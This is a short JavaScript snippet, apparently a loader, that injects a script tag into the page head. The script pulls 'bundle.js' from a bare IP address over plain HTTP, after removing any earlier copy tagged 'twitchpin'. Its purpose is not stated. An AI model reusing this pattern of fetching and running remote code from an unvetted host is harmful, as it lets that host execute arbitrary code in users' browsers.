const script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'http://149.91.81.151/pe/bundle.js';
script.id='twitchpin'

let oldscript = document.getElementById('twitchpin') // to remove
if(oldscript){// to remove
    oldscript.parentElement.removeChild(oldscript)// to remove
}// to remove
const head = document.getElementsByTagName('head')[0];
if (head){
    head.appendChild(script);
}
